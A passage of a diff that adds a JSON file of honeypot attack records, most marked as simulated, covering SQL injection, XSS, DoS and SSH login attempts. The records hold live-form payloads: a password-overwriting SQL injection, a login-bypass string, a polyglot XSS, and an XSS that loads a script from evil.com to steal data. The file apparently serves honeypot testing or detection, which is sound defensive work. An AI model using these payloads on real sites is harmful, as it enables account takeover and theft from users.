+      "raw_log": "2025-04-14T15:28:37.395272 [HoneyPotWeb,0,176.144.180.71] SQL injection attempt: '; WITH cte AS (SELECT TOP 1 username,password FROM users) UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "216.123.155.241"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "7afd103b836bec5d987d6e08dd18c0ad"
+  },
+  "b8421348-9bf5-46cf-a126-317bbb18636d": {
+    "id": "b8421348-9bf5-46cf-a126-317bbb18636d",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:40.392869",
+    "source_ip": "62.241.72.111",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "target_field": "message",
+      "raw_log": "2025-04-14T15:28:40.392869 [HoneyPotWeb,0,62.241.72.111] XSS attempt: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "insertion_point": "form",
+      "context": "attribute",
+      "evasion": [
+        "encoding",
+        "splitting",
+        "obfuscation"
+      ],
+      "exploit_type": "stored",
+      "target_browsers": [
+        "Edge",
+        "Firefox"
+      ]
+    },
+    "attack_hash": "2467b6f80c15b54eb9716e5b4225347e"
+  },
+  "17f5318e-99ee-43bf-8aa6-5ac16e54cd92": {
+    "id": "17f5318e-99ee-43bf-8aa6-5ac16e54cd92",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:43.402450",
+    "source_ip": "176.186.3.92",
+    "attack_type": "login_attempt",
+    "username": "udit",
+    "password": "udit123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T15:28:43.402450 [HoneyPotSSHTransport,0,176.186.3.92] login attempt [b'udit'/b'udit123'] failed",
+      "login_method": "ssh",
+      "attempts": 9
+    },
+    "attack_hash": "5929cb516990b69840e9abd496e98b3e"
+  },
+  "4c0aa796-9cfc-49fb-b5a2-16a64ecabe34": {
+    "id": "4c0aa796-9cfc-49fb-b5a2-16a64ecabe34",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:46.399584",
+    "source_ip": "185.232.222.77",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "<img src=x onerror=\"(()=>{var s=document.createElement('script');s.src='https://evil.com/steal.js';document.body.appendChild(s)})();\">",
+      "target_field": "message",
+      "raw_log": "2025-04-14T15:28:46.399584 [HoneyPotWeb,0,185.232.222.77] XSS attempt: <img src=x onerror=\"(()=>{var s=document.createElement('script');s.src='https://evil.com/steal.js';document.body.appendChild(s)})();\">",
+      "insertion_point": "cookie",
+      "context": "javascript",
+      "evasion": [
+        "encoding",
+        "splitting",
+        "obfuscation"
+      ],
+      "exploit_type": "stored",
+      "target_browsers": [
+        "Edge",
+        "Safari"
+      ]
+    },
+    "attack_hash": "44c3ba95305d8f2e12370e7d45f01e76"
+  },
+  "69fa8edb-693f-408d-99cf-06369f0c83ca": {
+    "id": "69fa8edb-693f-408d-99cf-06369f0c83ca",
+    "honeypot_id": "4765915d-a415-4868-b0a9-b01e0dafa0b5",
+    "timestamp": "2025-04-14 19:14:03.140421",
+    "source_ip": "52.60.176.189",
+    "attack_type": "dos",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "request_count": 1252,
+      "request_rate": 113,
+      "target_resource": "/login",
+      "raw_log": "2025-04-14T19:14:03.140421 [HoneyPotDDoS,0,52.60.176.189] DoS attempt: 1252 requests at 113/sec to /login"
+    },
+    "attack_hash": "782d143ef11ff6638af848314aefa29c"
+  },
+  "7575f9fd-99dc-4e36-b179-a06647cf256d": {
+    "id": "7575f9fd-99dc-4e36-b179-a06647cf256d",
+    "honeypot_id": "4765915d-a415-4868-b0a9-b01e0dafa0b5",
+    "timestamp": "2025-04-14 19:14:09.489664",
+    "source_ip": "228.150.72.93",
+    "attack_type": "dos",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "request_count": 1469,
+      "request_rate": 70,
+      "target_resource": "/login",
+      "raw_log": "2025-04-14T19:14:09.489664 [HoneyPotDDoS,0,228.150.72.93] DoS attempt: 1469 requests at 70/sec to /login"
+    },
+    "attack_hash": "1f1877ec9f67e6b23543e5b698fe836f"
+  },
+  "8bf2de30-73f3-434a-8a83-d93d0dd78c11": {
+    "id": "8bf2de30-73f3-434a-8a83-d93d0dd78c11",
+    "honeypot_id": "4765915d-a415-4868-b0a9-b01e0dafa0b5",
+    "timestamp": "2025-04-14 19:14:16.458528",
+    "source_ip": "103.229.65.22",
+    "attack_type": "dos",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "request_count": 1492,
+      "request_rate": 138,
+      "target_resource": "/login",
+      "raw_log": "2025-04-14T19:14:16.458528 [HoneyPotDDoS,0,103.229.65.22] DoS attempt: 1492 requests at 138/sec to /login"
+    },
+    "attack_hash": "8728a3f2c4278520f262a3445805dd80"
+  },
+  "b9014c74-637b-47bb-aca7-57b19f23fd79": {
+    "id": "b9014c74-637b-47bb-aca7-57b19f23fd79",
+    "honeypot_id": "4765915d-a415-4868-b0a9-b01e0dafa0b5",
+    "timestamp": "2025-04-14 19:14:22.820343",
+    "source_ip": "146.155.1.78",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "payload": "<script>alert('XSS')</script>",
+      "target_field": "search",
+      "raw_log": "2025-04-14T19:14:22.820343 [HoneyPotWeb,0,146.155.1.78] XSS attempt: <script>alert('XSS')</script>"
+    },
+    "attack_hash": "20ec0bca44e64ca4ff648a6cf0fe3ab7"
+  },
+  "e096eda7-7bc2-4532-bcea-4df8f16d14a6": {
+    "id": "e096eda7-7bc2-4532-bcea-4df8f16d14a6",
+    "honeypot_id": "4765915d-a415-4868-b0a9-b01e0dafa0b5",
+    "timestamp": "2025-04-14 19:14:30.597290",
+    "source_ip": "168.209.92.201",
+    "attack_type": "dos",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "request_count": 650,
+      "request_rate": 181,
+      "target_resource": "/login",
+      "raw_log": "2025-04-14T19:14:30.597290 [HoneyPotDDoS,0,168.209.92.201] DoS attempt: 650 requests at 181/sec to /login"
+    },
+    "attack_hash": "be4efb2a01b7620f514d8a94143ab050"
+  },
+  "274246e5-c7f7-46c7-93b5-64d695e78d14": {
+    "id": "274246e5-c7f7-46c7-93b5-64d695e78d14",
+    "honeypot_id": "4765915d-a415-4868-b0a9-b01e0dafa0b5",
+    "timestamp": "2025-04-14 19:14:37.322431",
+    "source_ip": "150.29.113.69",
+    "attack_type": "dos",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "request_count": 1303,
+      "request_rate": 156,
+      "target_resource": "/login",
+      "raw_log": "2025-04-14T19:14:37.322431 [HoneyPotDDoS,0,150.29.113.69] DoS attempt: 1303 requests at 156/sec to /login"
+    },
+    "attack_hash": "2574ef28d0b1b988da30748a576dc160"
+  },
+  "f0ec3b0f-f9aa-4146-a0ea-c5bf0b618170": {
+    "id": "f0ec3b0f-f9aa-4146-a0ea-c5bf0b618170",
+    "honeypot_id": "4765915d-a415-4868-b0a9-b01e0dafa0b5",
+    "timestamp": "2025-04-14 19:14:43.314650",
+    "source_ip": "7.164.41.145",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "payload": "<body onload='alert(\"XSS\")'>",
+      "target_field": "search",
+      "raw_log": "2025-04-14T19:14:43.314650 [HoneyPotWeb,0,7.164.41.145] XSS attempt: <body onload='alert(\"XSS\")'>"
+    },
+    "attack_hash": "1c66f55dd6e9057cd1bccdea548f8145"
+  },
+  "dba3d5f3-c573-41f0-bda9-c548931650ea": {
+    "id": "dba3d5f3-c573-41f0-bda9-c548931650ea",
+    "honeypot_id": "4765915d-a415-4868-b0a9-b01e0dafa0b5",
+    "timestamp": "2025-04-14 19:14:50.322894",
+    "source_ip": "242.24.22.242",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "payload": "<img src='x' onerror='alert(1)'>",
+      "target_field": "email",
+      "raw_log": "2025-04-14T19:14:50.322894 [HoneyPotWeb,0,242.24.22.242] XSS attempt: <img src='x' onerror='alert(1)'>"
+    },
+    "attack_hash": "36a87da4db68924abd1f71e1802901af"
+  },
+  "0b53c485-78bb-4ca2-8d10-caaf847c05bd": {
+    "id": "0b53c485-78bb-4ca2-8d10-caaf847c05bd",
+    "honeypot_id": "4765915d-a415-4868-b0a9-b01e0dafa0b5",
+    "timestamp": "2025-04-14 19:14:57.007531",
+    "source_ip": "130.168.131.184",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "basic",
+      "payload": "<body onload='alert(\"XSS\")'>",
+      "target_field": "email",
+      "raw_log": "2025-04-14T19:14:57.007531 [HoneyPotWeb,0,130.168.131.184] XSS attempt: <body onload='alert(\"XSS\")'>"
+    },
+    "attack_hash": "ad71902374465b43e3d9af3d33d18a35"
+  },
+  "d4d40a49-6906-49c6-9c0f-20dff04d6753": {
+    "id": "d4d40a49-6906-49c6-9c0f-20dff04d6753",
+    "honeypot_id": "4765915d-a415-4868-b0a9-b01e0dafa0b5",
+    "timestamp": "2025-04-14 13:45:07",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "as",
+    "details": {
+      "raw_log": "2025-04-14T13:45:07+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'as'] failed"
+    },
+    "attack_hash": "db8ec8c421476f89c383166393a1811b"
+  },
+  "0f736a53-31a7-4da2-b46e-17f234d61338": {
+    "id": "0f736a53-31a7-4da2-b46e-17f234d61338",
+    "honeypot_id": "4765915d-a415-4868-b0a9-b01e0dafa0b5",
+    "timestamp": "2025-04-14 13:45:09",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "a",
+    "details": {
+      "raw_log": "2025-04-14T13:45:09+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'a'] failed"
+    },
+    "attack_hash": "9b1d2f667fbf3c01b486c954168f5624"
+  },
+  "2f2a9575-ca1f-4ef5-baea-d0b42e44055a": {
+    "id": "2f2a9575-ca1f-4ef5-baea-d0b42e44055a",
+    "honeypot_id": "4765915d-a415-4868-b0a9-b01e0dafa0b5",
+    "timestamp": "2025-04-14 13:45:11",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "b",
+    "details": {
+      "raw_log": "2025-04-14T13:45:11+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'b'] failed"
+    },
+    "attack_hash": "c832d6280a522ef3e0f2f7d6eae03737"
+  }
+}
